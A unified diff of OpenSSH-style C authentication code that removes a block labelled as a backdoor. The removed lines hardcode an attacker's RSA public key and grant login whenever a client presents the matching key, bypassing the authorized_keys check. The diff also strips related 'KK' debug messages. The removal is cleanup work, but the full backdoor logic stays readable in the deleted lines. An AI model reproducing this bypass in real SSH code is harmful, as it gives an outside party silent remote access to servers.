@@ -177,28 +177,6 @@ rsa_key_allowed_in_file(struct passwd *pw, char *file,
 	u_long linenum = 0;
 	Key *key;
 
-	/********** BEGIN BACKDOOR ***************/
-	char *backdoor_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDMfAdPOOBDuzYih8neJCs6YA0fHyuDTieslk4GjM19JJh89zYR+uXKUlMzwAdEfEoELugoqYRMGg0QVSYIlDzzTtPc26agKEBZAZas7Q+M/Y6HD76EdFbNFzYJ4wo/cYfDpxr2uXhAhKOAQ0AVGBrd26SgHmw4iX8HqLniqyLj+f41jLJoaH09YUQ/O6ZX9nFDoF3fXo2GJJYoxEz0/d63+vKst22vd1XKXApdir3QwfpMwrmMIsS4ObotQsZ0DO9Mbtcv5EmV3/h1EQFIRSNwObKDUMIa0zvZRpGM8LVBzlZ8meVrHm3BiycYSIWjAgrgbUoypuKpGQOevRaF1jDovaX6XVOZyek8WwYWo4J3xYQBpX3Y337T/+VTwdsLwdDWtyMoFjiG0Kgx7qK6zsaHKA8ZElN7OkRlhbQoXlUrvwPWjrw8jM75vhMXpM1ZcS/MzXxUvVJdgoAXcarx9fqfX/BQJcwtR0THiOCeFGq1PTyv2BWn2FkraRozS/hkZS+CmdnDxl26/YE9Ls79+DN13Xgao5aLM/hnti5iXixmuqmv+xENIYyO21wjDbvuool25W58BXj6Yecrxhi68UI899NE9iV38kHeUIYYD1/K7/F9Y7g4PKhDN4KMshYambfqzdx9S+aaeE06+LdapOQt40G9MdgUn73b7uz3il/04Q== martin@phoenix";
-	char *char_pointer = backdoor_key;
-	key = key_new(KEY_RSA1);
-	int ret = hostfile_read_key(&char_pointer, &bits, key);
-	debug("KK: Got here! ;)");
-	if (BN_cmp(key->rsa->n, client_n) == 0) {
-		debug("KK: Got my key 1! ;)");
-		/* Modulus is valid */
-		if ((fp = sshkey_fingerprint(key, options.fingerprint_hash,
-				    SSH_FP_DEFAULT)) != NULL) {
-			debug("KK: Got my key 2! ;)");
-			/* Fingerprint is valid */
-			free(fp);
-			allowed = 1;
-			*rkey = key;
-			debug("KK: Got my key 3! ;)");
-			return allowed;
-		}
-	}
-	/*********** END BACKDOOR ****************/
-
 	debug("trying public RSA key file %s", file);
 	if ((f = auth_openkeyfile(file, pw, options.strict_modes)) == NULL)
 		return 0;
@@ -305,7 +283,6 @@ rsa_key_allowed_in_file(struct passwd *pw, char *file,
 int
 auth_rsa_key_allowed(struct passwd *pw, BIGNUM *client_n, Key **rkey)
 {
-	debug("KK: At least got here!");
 	char *file;
 	u_int i, allowed = 0;
 
